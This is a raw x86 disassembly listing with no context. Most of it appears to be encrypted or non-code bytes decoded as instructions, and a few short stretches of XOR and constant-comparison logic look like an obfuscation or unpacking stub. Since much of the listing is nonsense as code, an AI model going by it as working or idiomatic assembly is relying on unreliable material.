  40c251:	mov    edx,0x6e6428e3
  40c256:	je     0x40c212
  40c258:	mov    ah,cl
  40c25a:	es pop edi
  40c25d:	int    0x2c
  40c25f:	cs imul ebp,ebx,0xffffffd3
  40c263:	jns    0x40c2a6
  40c265:	int3   
  40c266:	jl     0x40c2df
  40c268:	add    eax,0x1d2042ec
  40c26d:	in     eax,dx
  40c26e:	mov    edx,gs
  40c270:	mov    al,ds:0x69329f45
  40c275:	retf   
  40c276:	ins    DWORD PTR es:[edi],dx
  40c277:	jns    0x40c234
  40c279:	xlat   BYTE PTR ds:[ebx]
  40c27a:	in     eax,dx
  40c27b:	mov    ebp,0x9845bd5c
  40c280:	out    dx,al
  40c281:	jmp    0xa8dd36fa
  40c286:	and    DWORD PTR [edx-0x4e72b476],0x77
  40c28d:	into   
  40c28e:	pushf  
  40c28f:	ja     0x40c30d
  40c291:	pop    esp
  40c292:	fisttp WORD PTR [esi+edx*4-0x977046]
  40c299:	shr    BYTE PTR [edx-0x7fca3ca1],cl
  40c29f:	call   0x641:0xce371324
  40c2a6:	xchg   ecx,eax
  40c2a7:	jnp    0x40c2c9
  40c2a9:	stc    
  40c2aa:	std    
  40c2ab:	pop    ebx
  40c2ac:	test   ebx,0x4d1e10a7
  40c2b2:	or     ch,BYTE PTR [edx+0x619b957]
  40c2b8:	test   edi,eax
  40c2ba:	popf   
  40c2bb:	repnz int3 
  40c2bd:	or     BYTE PTR [ecx-0x5ba47a78],ah
  40c2c3:	cmp    bl,BYTE PTR [eax+0x2]
  40c2c6:	fidiv  DWORD PTR [esi+0x53]
  40c2c9:	out    dx,al
  40c2ca:	jge    0x40c299
  40c2cc:	fidivr DWORD PTR [edi-0x5bb717be]
  40c2d2:	(bad)  
  40c2d3:	(bad)  
  40c2d4:	mov    ch,0xde
  40c2d6:	sub    al,0xae
  40c2d8:	mov    esi,0x9aed5ca4
  40c2dd:	js     0x40c30c
  40c2df:	retf   0x1ae8
  40c2e2:	jl     0x40c293
  40c2e4:	sbb    ebp,DWORD PTR [esi+0x3c]
  40c2e7:	and    BYTE PTR [eax-0x5cfee365],bh
  40c2ed:	call   0xfd2d:0x7de0f20d
  40c2f4:	scas   al,BYTE PTR es:[edi]
  40c2f5:	push   es
  40c2f6:	(bad)  
  40c2f7:	cmc    
  40c2f8:	jp     0x40c30a
  40c2fa:	sbb    al,0x3
  40c2fc:	bound  esi,QWORD PTR ds:0x96d65d4b
  40c302:	pop    edx
  40c303:	push   0xffffff8b
  40c305:	adc    eax,0x821faf10
  40c30a:	mov    edi,0xe2d11093
  40c30f:	out    0x82,eax
  40c311:	push   ebx
  40c312:	jp     0x40c2c9
  40c314:	xchg   ebp,eax
  40c315:	fucom  st(1)
  40c317:	xor    DWORD PTR [edi+edi*2+0x60],0x18
  40c31c:	stc    
  40c31d:	inc    esp
  40c31e:	xlat   BYTE PTR ds:[ebx]
  40c31f:	mov    dl,0x39
  40c321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c322:	inc    edx
  40c323:	enterw 0xf979,0x33
  40c328:	call   0x78ed61cc
  40c32d:	and    DWORD PTR [esi+0x37f5b13d],ecx
  40c333:	ss loopne 0x40c384
  40c336:	ret    
  40c337:	in     al,dx
  40c338:	jnp    0x40c38a
  40c33a:	call   0x416c20
  40c33f:	xor    eax,0x687b
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x42272c
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
  40c373:	mov    edx,DWORD PTR ds:0x422518
  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x42272c,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	daa    
  40c3d1:	pop    edx
  40c3d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3d3:	mov    esp,0x1818fd0d
  40c3d8:	outs   dx,BYTE PTR ds:[esi]
  40c3d9:	adc    bl,BYTE PTR [eax]
  40c3db:	sbb    BYTE PTR [ecx+0xe15652],cl
  40c3e1:	xchg   esi,eax
  40c3e2:	xchg   edi,eax
  40c3e3:	and    ebx,DWORD PTR gs:[ebp-0x3daff4c5]
  40c3ea:	clc    
  40c3eb:	dec    esp
  40c3ec:	pop    ss
  40c3ed:	xor    eax,0x57d44ddd
  40c3f2:	fiadd  DWORD PTR [edx-0x7c]
  40c3f5:	sub    BYTE PTR [ecx-0x3],ch
  40c3f8:	test   BYTE PTR [ecx+0x654ccf09],bh
  40c3fe:	mov    ch,0xfb
  40c400:	pop    edx
  40c401:	jp     0x40c410
  40c403:	dec    edx
  40c404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c405:	push   cs
  40c406:	dec    edi
  40c407:	jb     0x40c395
  40c409:	xor    BYTE PTR [edx-0x32dce40],bl
  40c40f:	mov    al,0xcf
  40c411:	lea    di,ds:0x5fe83cdc
  40c418:	popf   
  40c419:	test   BYTE PTR [edi-0x50b38579],bl
  40c41f:	dec    esp
  40c420:	sub    ebp,DWORD PTR [edx+0x6a]
  40c423:	sbb    esp,ebx
  40c425:	(bad)  [ecx-0x5059adaa]
  40c42b:	mov    ecx,0x198aaa2b
  40c430:	xchg   esi,eax
  40c431:	repnz sub esp,esp
  40c434:	adc    ebx,DWORD PTR [edi+eax*8]
  40c437:	add    edi,DWORD PTR [ebx+0x71b08fb]
  40c43d:	lods   al,BYTE PTR ds:[esi]
  40c43e:	sub    edi,DWORD PTR [ebx]
  40c440:	mov    sp,0x48a7
  40c444:	or     ebx,esp
  40c446:	push   ss
  40c447:	and    BYTE PTR [esi-0x34a583ce],ch
  40c44d:	es loope 0x40c4b5
  40c450:	dec    esi
  40c451:	call   0x9a7c:0x64737614
  40c458:	ret    
  40c459:	mov    dh,0x32
  40c45b:	xchg   esi,eax
  40c45c:	int3   
  40c45d:	and    al,0xcc
  40c460:	fstp   DWORD PTR [edi+eax*2+0x1c3512a4]
  40c467:	fidivr WORD PTR [ecx+0x6d]
  40c46a:	dec    esp
  40c46b:	jmp    0xc371:0xe1afe24b
  40c472:	out    dx,eax
  40c473:	test   al,0xc6
  40c475:	iret   
  40c476:	(bad)  
  40c477:	xlat   BYTE PTR ds:[ebx]
  40c478:	mov    dl,0x7d
  40c47a:	into   
  40c47b:	rol    DWORD PTR [ecx],cl
  40c47d:	and    edx,DWORD PTR [edx+0x3b549bf9]
  40c483:	mov    ecx,0xe988c75b
  40c488:	jecxz  0x40c434
  40c48a:	addr16 jb 0x40c4f4
  40c48d:	retf   
  40c48e:	mov    ds:0xed7e8863,al
  40c493:	push   0x4f
  40c495:	mov    ah,0xa4
  40c497:	leave  
  40c498:	arpl   WORD PTR [ecx],sp
  40c49a:	or     dh,BYTE PTR [edi+0x52]
  40c49d:	xor    DWORD PTR [eax+0x278f5903],edx
  40c4a3:	inc    edi
  40c4a4:	inc    ebx
  40c4a5:	ins    BYTE PTR es:[edi],dx
  40c4a6:	xor    DWORD PTR [esi+edx*8-0x5c8e690d],edx
  40c4ad:	dec    esi
  40c4ae:	pushf  
  40c4af:	ret    
  40c4b0:	sbb    al,0x36
  40c4b2:	cdq    
  40c4b3:	icebp  
  40c4b4:	mov    dh,BYTE PTR [edx]
  40c4b6:	inc    ebp
  40c4b7:	je     0x40c4b2
  40c4b9:	cmp    DWORD PTR [esi-0x526f1b28],ebp
  40c4bf:	push   ds
  40c4c0:	inc    edx
  40c4c1:	icebp  
  40c4c2:	sub    BYTE PTR [ecx-0x6e3a40f7],0xd9
  40c4c9:	es or  bh,BYTE PTR gs:[eax-0x2543ecbc]
  40c4d1:	jae    0x40c4bb
  40c4d3:	loope  0x40c49b
  40c4d5:	retf   0x98b7
  40c4d8:	adc    eax,esp
  40c4da:	xlat   BYTE PTR ds:[ebx]
  40c4db:	leave  
  40c4dc:	push   es
  40c4dd:	jnp    0x40c530
  40c4df:	ret    
  40c4e0:	in     eax,dx
  40c4e1:	sub    eax,0x26eb5c5f
  40c4e6:	dec    ebp
  40c4e7:	shl    BYTE PTR [ebp+ebx*8+0x73],1
  40c4eb:	add    ebx,esp
  40c4ed:	inc    ebp
  40c4ee:	test   al,bl
  40c4f0:	sub    DWORD PTR [edi-0x23],edx
  40c4f3:	or     al,0x0
  40c4f5:	push   ebp
  40c4f6:	pop    ds
  40c4f7:	mov    eax,ds:0xe232c381
  40c4fc:	sub    DWORD PTR [edi],edx
  40c4fe:	or     al,BYTE PTR [edi-0x3bff83e3]
  40c504:	(bad)  
  40c505:	je     0x40c521
  40c507:	xlat   BYTE PTR ds:[ebx]
  40c508:	mov    edx,0xe42f142a
  40c50d:	xchg   ecx,eax
  40c50e:	outs   dx,DWORD PTR ds:[esi]
  40c50f:	aas    
  40c510:	fdiv   st(0),st
  40c512:	(bad)  
  40c513:	clc    
  40c514:	dec    ecx
  40c515:	mov    gs,WORD PTR [eax+edx*2+0x7e]
  40c519:	fadd   QWORD PTR [ecx+edx*2]
  40c51c:	xchg   ebx,eax
  40c51d:	imul   eax,DWORD PTR [esi],0xffffffb2
  40c520:	add    al,0x75
  40c522:	add    DWORD PTR [edx+edi*2],eax
  40c525:	data16 cmp BYTE PTR [ecx-0x128571c5],bl
  40c52c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c52d:	aaa    
  40c52e:	daa    
  40c52f:	fwait
  40c530:	lea    ebx,[eax+0x67adcd3e]
  40c536:	mov    ebp,0xd38c8a09
  40c53b:	sbb    bl,BYTE PTR [edx-0x76f5a1a2]
  40c541:	cli    
  40c542:	xor    eax,0x8679731b
  40c547:	mov    ?,WORD PTR [ecx+0x712ce2ab]
  40c54d:	sbb    ah,0x79
  40c550:	pop    edi
  40c551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c552:	push   eax
  40c553:	add    eax,0x1bd14670
  40c558:	rcr    BYTE PTR [edi+0x2a],0x66
  40c55c:	add    edx,ebx
  40c55e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c55f:	mov    ecx,0xd7585a84
  40c564:	or     DWORD PTR ds:0xa8615eb0,0x9f85478
  40c56e:	outs   dx,DWORD PTR ds:[esi]
  40c56f:	xchg   ecx,eax
  40c570:	pusha  
  40c571:	xchg   DWORD PTR [edx+edi*4],ecx
  40c574:	(bad)  
  40c575:	iret   
  40c576:	or     BYTE PTR [esi-0x4f93304f],al
  40c57c:	add    al,0x13
  40c57e:	dec    esp
  40c57f:	dec    esi
  40c580:	push   0xacb02511
  40c585:	fldenv [ebp-0x3749a61e]
  40c58b:	add    bl,BYTE PTR [ecx-0x1e]
  40c58e:	pop    esi
  40c58f:	jo     0x40c52a
  40c591:	mov    WORD PTR [ebx-0x287c13a8],gs
  40c597:	pusha  
  40c598:	xor    al,0xaf
  40c59a:	sub    edi,ecx
  40c59c:	inc    ebx
  40c59d:	jbe    0x40c5bd
  40c59f:	adc    DWORD PTR [ebx+0x4cb53717],esi
  40c5a5:	in     eax,0xe7
  40c5a7:	(bad)  
  40c5a8:	shl    DWORD PTR [esi-0x19],1
  40c5ab:	gs test al,0x2c
  40c5ae:	das    
  40c5af:	mov    ah,bh
  40c5b1:	and    ah,ah
  40c5b3:	icebp  
  40c5b4:	test   BYTE PTR [esi],0xb8
  40c5b7:	div    DWORD PTR [ebp+0x1438fbf4]
  40c5bd:	dec    edx
  40c5be:	inc    edi
  40c5bf:	pop    eax
  40c5c0:	dec    ebx
  40c5c1:	jbe    0x40c623
  40c5c3:	mov    ebx,0x7cc4f478
  40c5c8:	mul    BYTE PTR [edx+edi*4]
  40c5cb:	jnp    0x40c607
  40c5cd:	jnp    0x40c60a
  40c5cf:	pop    ebp
  40c5d1:	test   al,0xda
  40c5d3:	in     eax,0xab
  40c5d5:	jle    0x40c5bb
  40c5d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5d8:	add    cl,BYTE PTR [esi]
  40c5da:	push   eax
  40c5db:	pop    edi
  40c5dc:	xor    BYTE PTR [edi+0x3d],0x4d
  40c5e0:	cmc    
  40c5e1:	retf   
  40c5e2:	scas   eax,DWORD PTR es:[edi]
  40c5e3:	sbb    al,cl
  40c5e5:	repnz imul esi,DWORD PTR gs:[ecx],0xef4ebae8
  40c5ed:	test   DWORD PTR [ebx],edx
  40c5ef:	jmp    0xd355:0x15b3e774
  40c5f6:	cmp    al,0xdb
  40c5f8:	mov    eax,ds:0xf87f93e2
  40c5fd:	mov    eax,ds:0x2f69add3
  40c602:	sub    eax,0xd415bb24
  40c607:	fist   DWORD PTR [ebx]
  40c609:	push   edi
  40c60a:	daa    
  40c60b:	or     BYTE PTR [edi],cl
  40c60d:	sub    BYTE PTR [ebx-0x4db74496],dl
  40c613:	adc    BYTE PTR [ebx+ecx*8-0xc58b3e4],ah
  40c61a:	inc    edi
  40c61b:	(bad)  
  40c61c:	adc    bl,BYTE PTR [ebx]
  40c61e:	add    ch,0x3
  40c621:	scas   al,BYTE PTR es:[edi]
  40c622:	add    DWORD PTR [eax+esi*4-0x41],ebx
  40c626:	(bad)  
  40c628:	loopne 0x40c5e6
  40c62a:	fincstp 
  40c62c:	jne    0x40c688
  40c62e:	mov    eax,0x4dfac600
  40c633:	add    al,0x53
  40c635:	scas   al,BYTE PTR es:[edi]
  40c636:	adc    DWORD PTR [ecx+0x6f8dd852],0xb7adee1a
  40c640:	mov    ebx,0x606165d7
  40c645:	das    
  40c646:	push   0xf57eb92
  40c64b:	call   0x8f25:0x8cac470f
  40c652:	jnp    0x40c6c9
  40c654:	jae    0x40c601
  40c656:	cmp    DWORD PTR [esp+edx*2],edx
  40c659:	push   ecx
  40c65a:	inc    ebp
  40c65b:	xchg   ecx,eax
  40c65c:	sti    
  40c65d:	mov    ah,0x6b
  40c65f:	cmp    BYTE PTR [edx-0xb],al
  40c662:	jl     0x40c602
  40c664:	adc    eax,DWORD PTR [ebx-0x4c]
  40c667:	jo     0x40c6c9
  40c669:	sbb    cl,ah
  40c66b:	sbb    DWORD PTR [edx],ecx
  40c66d:	pusha  
  40c66e:	push   ds
  40c66f:	xchg   ebp,eax
  40c670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c671:	add    eax,0x2cae9a26
  40c676:	shl    BYTE PTR [ebp+0xeb4c8bb],cl
  40c67c:	xchg   edx,eax
  40c67d:	inc    esi
  40c67e:	aaa    
  40c67f:	scas   al,BYTE PTR es:[edi]
  40c680:	in     al,dx
  40c681:	test   DWORD PTR [esi+0x78],esp
  40c684:	adc    eax,0xecfa8ffe
  40c689:	fistp  DWORD PTR [ecx-0x20]
  40c68c:	sub    al,0x8f
  40c68e:	inc    ecx
  40c68f:	add    DWORD PTR ds:0x5ebdcad7,esp
  40c695:	fsub   DWORD PTR [edx-0x26]
  40c698:	loopne 0x40c6c8
  40c69a:	fdivp  st(5),st
  40c69c:	les    edx,FWORD PTR [ebp-0x23]
  40c69f:	and    bl,BYTE PTR [ecx+ebp*1+0x73]
  40c6a3:	xchg   ebp,eax
  40c6a4:	mov    ecx,0xf0c76670
  40c6a9:	adc    DWORD PTR [edx],eax
  40c6ab:	xchg   ebp,eax
  40c6ac:	cmp    bl,BYTE PTR [ecx-0x4a069c1b]
  40c6b2:	mov    esi,0xc6c2653e
  40c6b7:	scas   eax,DWORD PTR es:[edi]
  40c6b8:	add    dh,bh
  40c6ba:	cmp    edx,DWORD PTR [edx+0x4842e323]
  40c6c0:	imul   edx,DWORD PTR [ebp+0x3e],0xb23ae08a
  40c6c7:	xor    edx,ebp
  40c6c9:	cmc    
  40c6ca:	fwait
  40c6cb:	out    dx,al
  40c6cc:	retf   
  40c6cd:	dec    ebp
  40c6ce:	mov    edi,0x18bb1f9c
  40c6d3:	shl    BYTE PTR [esi+edx*2+0x1],0x64
  40c6d8:	mov    esp,0x7e2afab1
  40c6dd:	sub    ch,BYTE PTR [edx+0x7e]
  40c6e0:	push   esi
  40c6e1:	mov    DWORD PTR [edx-0x7928eeab],esi
  40c6e7:	sbb    BYTE PTR [edx+0x316fff3f],ah
  40c6ed:	mov    dh,0x7
  40c6ef:	stos   DWORD PTR es:[edi],eax
  40c6f0:	jle    0x40c6db
  40c6f2:	jae    0x40c752
  40c6f4:	arpl   WORD PTR [edi+0x1b8e7ba6],dx
  40c6fa:	dec    esp
  40c6fb:	xor    eax,0x1143add0
  40c700:	hlt    
  40c701:	pop    eax
  40c702:	dec    edi
  40c703:	add    eax,edx
  40c705:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c706:	(bad)  
  40c708:	ins    DWORD PTR es:[edi],dx
  40c709:	sbb    al,0x6d
  40c70b:	repz lahf 
  40c70d:	aaa    
  40c70e:	push   ebx
  40c70f:	leave  
  40c710:	ds push eax
  40c712:	jecxz  0x40c72f
  40c714:	sub    BYTE PTR [ebx-0x118876e9],ah
  40c71a:	iret   
  40c71b:	inc    ecx
  40c71c:	int    0x69
  40c71e:	push   0xffffffd8
  40c720:	(bad)  
  40c721:	jge    0x40c6fd
  40c723:	mov    edi,eax
  40c725:	adc    DWORD PTR [ebx-0xc64b2f1],eax
  40c72b:	repz add edi,DWORD PTR [ecx-0x238392af]
  40c732:	xchg   ecx,eax
  40c733:	push   ebx
  40c734:	add    al,0xac
  40c736:	mov    ch,BYTE PTR [edx+ecx*2+0x66d6f30]
  40c73d:	outs   dx,DWORD PTR ds:[esi]
  40c73e:	fisubr DWORD PTR [edi+ecx*2]
  40c741:	pushf  
  40c742:	inc    ebp
  40c743:	sub    BYTE PTR [edi+0x2f],bl
  40c746:	or     ah,BYTE PTR [esi+edx*2-0x6d3fce03]
  40c74d:	mov    ch,0x2c
  40c74f:	repz xchg esi,eax
  40c751:	dec    edx
  40c752:	xchg   ebp,eax
  40c753:	test   DWORD PTR [ebp+ebx*8-0x43d7b42b],0x39fbcab
  40c75e:	lods   al,BYTE PTR ds:[esi]
  40c75f:	stc    
  40c760:	or     DWORD PTR [edi+0x43],0x2dd5af84
  40c767:	push   0x70
  40c769:	ror    DWORD PTR [esi-0x4a4393f4],1
  40c76f:	sub    eax,0x212e3d61
  40c774:	loope  0x40c76c
  40c776:	stos   BYTE PTR es:[edi],al
  40c777:	(bad)  
  40c778:	jle    0x40c7e7
  40c77a:	pop    eax
  40c77b:	push   cs
  40c77c:	sbb    BYTE PTR [ebp-0x62ebbdb8],dl
  40c782:	aad    0xa4
  40c784:	jp     0x40c7dd
  40c786:	inc    ebx
  40c787:	xchg   edx,eax
  40c788:	shl    BYTE PTR [ecx],0x32
  40c78b:	scas   eax,DWORD PTR es:[edi]
  40c78c:	imul   esi,DWORD PTR [esi+eax*1+0x78],0x474dd903
  40c794:	pop    ds
  40c795:	(bad)  
  40c796:	dec    edx
  40c797:	adc    al,0x78
  40c799:	mov    ?,WORD PTR [eax-0x5f]
  40c79c:	mov    ah,0x18
  40c79e:	outs   dx,BYTE PTR ds:[esi]
  40c79f:	push   0xcb27d34b
  40c7a4:	cmp    esi,DWORD PTR [ebp-0x2d]
  40c7a7:	mov    eax,DWORD PTR [ecx+0x30]
  40c7aa:	add    al,dl
  40c7ac:	pusha  
  40c7ad:	stos   DWORD PTR es:[edi],eax
  40c7ae:	jle    0x40c755
  40c7b0:	jns    0x40c7f7
  40c7b2:	out    dx,al
  40c7b3:	mov    cl,0xda
  40c7b5:	xor    al,0x42
  40c7b7:	add    al,dl
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi+0x4b162c70]
  40c7fd:	jle    0x40c862
  40c7ff:	cmc    
  40c800:	sbb    BYTE PTR [eax],bl
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    BYTE PTR [edi],ch
  40c807:	out    0xe4,al
  40c809:	mul    DWORD PTR [edi+0x303e52de]
  40c80f:	jno    0x40c7b9
  40c811:	inc    ebx
  40c812:	shr    DWORD PTR [ecx+0x3e3aafb9],cl
  40c818:	mov    ebx,0x5b25ca6b
  40c81d:	jns    0x40c816
  40c81f:	or     DWORD PTR [edi],esp
  40c821:	ret    0xe055
  40c824:	sbb    ebp,DWORD PTR [ecx+ecx*1+0x74]
  40c828:	stos   BYTE PTR es:[edi],al
  40c829:	fisub  WORD PTR [ebp-0x625fa5be]
  40c82f:	aas    
  40c830:	repnz fwait
  40c832:	push   esp
  40c833:	loopne 0x40c88f
  40c835:	clc    
  40c836:	ins    DWORD PTR es:[edi],dx
  40c837:	rol    BYTE PTR [eax-0x4832ab39],1
  40c83d:	ret    0x3976
  40c840:	dec    esp
  40c841:	push   0x19
  40c843:	and    al,0x88
  40c845:	sbb    ebx,ebx
  40c847:	push   ebp
  40c848:	aaa    
  40c849:	(bad)  
  40c84a:	fdivr  DWORD PTR [eax-0x41]
  40c84d:	aaa    
  40c84e:	mov    eax,ds:0x85373e66
  40c853:	xchg   ebx,eax
  40c854:	pop    ebx
  40c855:	xchg   BYTE PTR [ecx+0x21a3848f],cl
  40c85b:	add    dh,BYTE PTR [esi-0x85448a4]
  40c861:	lods   al,BYTE PTR ds:[esi]
  40c862:	imul   ebx,DWORD PTR [esi+0x21],0x9c192a95
  40c869:	mov    DWORD PTR [edi],edx
  40c86b:	popf   
  40c86c:	sub    DWORD PTR [ecx+0x24],esi
  40c86f:	in     eax,0x5d
  40c871:	sbb    BYTE PTR [ebx-0x2c12e984],0xc3
  40c878:	fistp  DWORD PTR ds:0xfd6ba28b
  40c87e:	inc    edx
  40c87f:	jne    0x40c8c6
  40c881:	jmp    0x40c82b
  40c883:	push   esi
  40c884:	(bad)  
  40c887:	xchg   esi,edi
  40c889:	outs   dx,BYTE PTR ds:[esi]
  40c88a:	mov    DWORD PTR [ecx],0xd9349dc1
  40c890:	dec    esp
  40c891:	and    DWORD PTR [ecx],ecx
  40c893:	adc    al,0x1f
  40c895:	loope  0x40c8ea
  40c897:	cmc    
  40c898:	loop   0x40c875
  40c89a:	shl    BYTE PTR [edi-0x39],cl
  40c89d:	adc    eax,0x4cedcf15
  40c8a2:	shl    eax,0x8a
  40c8a5:	inc    ebx
  40c8a6:	add    ebp,esi
  40c8a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8a9:	adc    ebx,DWORD PTR [edi+0x3e]
  40c8ac:	out    0x19,al
  40c8ae:	pop    ss
  40c8af:	pop    esp
  40c8b0:	and    al,0xba
  40c8b2:	pop    edx
  40c8b3:	add    BYTE PTR [eax],al
  40c8b5:	sbb    DWORD PTR [edx-0x65],eax
  40c8b8:	retf   0x5c95
  40c8bb:	push   0x1e218199
  40c8c0:	test   al,0x52
  40c8c2:	fwait
  40c8c3:	aaa    
  40c8c4:	jb     0x40c8d3
  40c8c6:	pop    edx
  40c8c7:	std    
  40c8c8:	mov    bl,0xa0
  40c8ca:	enter  0x6c46,0xc6
  40c8ce:	enter  0xb34c,0x3e
  40c8d2:	mov    cl,0x9c
  40c8d4:	pop    eax
  40c8d5:	inc    ecx
  40c8d6:	dec    edi
  40c8d7:	fld    st(5)
  40c8d9:	mov    bh,0x5f
  40c8db:	dec    esi
  40c8dc:	sti    
  40c8dd:	fisttp WORD PTR [esi+0x2495a062]
  40c8e3:	or     al,0xe3
  40c8e5:	sbb    al,0xf4
  40c8e7:	rcl    DWORD PTR [eax-0x6007ac8f],cl
  40c8ed:	sub    BYTE PTR [esi-0x76409e6b],cl
  40c8f3:	pop    edi
  40c8f4:	adc    eax,0x7da44cbc
  40c8f9:	mov    ch,0xcc
  40c8fb:	sub    dl,ch
  40c8fd:	arpl   WORD PTR [ebp-0x4606a096],cx
  40c903:	pop    es
  40c904:	jge    0x40c8d8
  40c906:	dec    esi
  40c907:	pop    edx
  40c908:	call   0xd581:0x54ef4d85
  40c90f:	dec    edx
  40c910:	or     bl,ah
  40c912:	jmp    0x40c98a
  40c914:	les    ebp,FWORD PTR [eax]
  40c916:	pop    ebp
  40c917:	mov    ebx,0xfba75f58
  40c91c:	stc    
  40c91d:	push   eax
  40c91e:	cmp    ecx,DWORD PTR ds:0x70da9985
  40c924:	fsub   st,st(3)
  40c926:	ffree  st(6)
  40c928:	(bad)  
  40c929:	fs sti 
  40c92b:	xchg   ebp,eax
  40c92c:	cmc    
  40c92d:	jo     0x40c936
  40c92f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c930:	aad    0x23
  40c932:	mov    ch,0xdd
  40c934:	pop    edx
  40c935:	mov    WORD PTR [ebx],gs
  40c937:	inc    edx
  40c938:	xlat   BYTE PTR ds:[ebx]
  40c939:	mov    ebp,0x9b667514
  40c93e:	bound  ecx,QWORD PTR [ebx-0x78]
  40c941:	test   BYTE PTR [edx+0x43],dl
  40c944:	xchg   edi,eax
  40c945:	cwde   
  40c946:	push   ebx
  40c947:	jb     0x40c969
  40c949:	inc    ebp
  40c94a:	sbb    BYTE PTR [ebp-0x28],bl
  40c94d:	popf   
  40c94e:	push   cs
  40c94f:	xchg   bh,ch
  40c951:	shr    BYTE PTR [edx+esi*1-0x3d057d3],1
  40c958:	mov    eax,0x6c6dfbcc
  40c95d:	mov    edi,0x3956ecdc
  40c962:	pop    ds
  40c963:	ds inc esi
  40c965:	mov    ebx,0x5d2d8478
  40c96a:	inc    ecx
  40c96b:	retf   0x8d19
  40c96e:	pcmpgtd mm0,mm1
  40c971:	out    0xb8,al
  40c973:	pop    es
  40c974:	popf   
  40c975:	test   eax,0xd5daabf7
  40c97a:	das    
  40c97b:	ret    
  40c97c:	aam    0x5
  40c97e:	push   ebp
  40c97f:	ins    BYTE PTR es:[edi],dx
  40c980:	mov    ch,0xd8
  40c982:	jnp    0x40c9dc
  40c984:	or     eax,ebx
  40c986:	retf   0x38a1
  40c989:	mov    ebx,DWORD PTR [edx+0x2f5d8dcc]
  40c98f:	lods   al,BYTE PTR ds:[esi]
  40c990:	les    ebx,FWORD PTR [esi+eiz*1]
  40c993:	pop    DWORD PTR [edx]
  40c995:	push   ds
  40c996:	pop    ds
  40c997:	fst    DWORD PTR [ebx]
  40c999:	scas   eax,DWORD PTR es:[edi]
  40c99a:	mov    dh,0xba
  40c99c:	dec    edi
  40c99d:	push   eax
  40c99e:	jo     0x40c9d7
  40c9a0:	mov    ch,0x6
  40c9a2:	subps  xmm2,XMMWORD PTR [ebp-0x77593f8c]
  40c9a9:	inc    ecx
  40c9aa:	sbb    dh,BYTE PTR ds:0xbfabcd8b
  40c9b0:	fdivr  QWORD PTR [ecx-0x13]
  40c9b3:	shl    DWORD PTR [ebp+0x6b],cl
  40c9b6:	or     ebx,esp
  40c9b8:	dec    ebp
  40c9b9:	in     al,dx
  40c9ba:	adc    al,0x61
  40c9bc:	xchg   edx,eax
  40c9bd:	adc    cl,cl
  40c9bf:	xchg   ebp,eax
  40c9c0:	mov    ds:0xc0548b3b,al
  40c9c5:	iret   
  40c9c6:	mov    ch,0x28
  40c9c8:	stos   DWORD PTR es:[edi],eax
  40c9c9:	pop    es
  40c9ca:	inc    esi
  40c9cb:	mov    WORD PTR [edx-0x29],?
  40c9ce:	dec    edi
  40c9cf:	cdq    
  40c9d0:	repnz xlat BYTE PTR ds:[ebx]
  40c9d2:	sub    eax,DWORD PTR [ebp+0x591b03e9]
  40c9d8:	or     al,0x5a
  40c9da:	cld    
  40c9db:	ror    BYTE PTR [ecx+0x52c35c8f],1
